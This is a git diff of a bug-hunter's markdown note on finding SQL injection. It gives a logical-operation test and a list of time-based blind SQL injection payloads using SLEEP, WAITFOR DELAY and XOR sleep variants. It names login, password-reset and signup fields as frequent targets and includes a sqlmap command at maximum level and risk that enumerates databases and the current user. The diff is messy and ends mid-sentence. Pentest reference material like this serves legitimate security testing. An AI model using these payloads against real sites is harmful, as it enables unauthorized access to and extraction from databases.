@@ -1,12 +1,22 @@
+## How to find SQL injectiosn vulnerability?
+
+### 1) logical operation
 One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results.
+For example: if the GET parameter `?username=Peter` returns the same content as `?username=Peter'` or `?username=Peter+'1'='1` then, you found a SQL injection.
 
-For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection.
+## 2) Time Based SQL Injection
+90% from my finds in SQL injection as
+ [POST Request] 
+1 Login page in username parameter 
+2 Forget password page username parameter
+3 Singup Page firstname and last name parameter
 
-
+Payloads:
 ```
 orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 (SlEeP%09(14-(5-2)))
 ')) or sleep(5)=' 
+' WAITFOR DELAY '0:0:5'-- 
 ;waitfor delay '0:0:5'-- 
 );waitfor delay '0:0:5'-- 
 ';waitfor delay '0:0:5'-- 
@@ -14,25 +24,21 @@ orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
 ');waitfor delay '0:0:5'-- 
 ");waitfor delay '0:0:5'-- 
 ));waitfor delay '0:0:5'-- 
-```
-
-![image](https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png)
-```
 0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z
 0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z%20=%3E
 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
 ```
 
+![image](https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png)
+```
+
+```
+
 sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
 
-90% from my finds in SQL injection as
- [POST Request] 
-1 Login page in username parameter 
-2 Forget password page username parameter
-3 Singup Page firstname and last name parameter
 
-' WAITFOR DELAY '0:0:5'-- 
-';WAITFOR DELAY '0:0:5'-- 
+
+
 ===>Comment
 
 If sometimes you cant exploits  
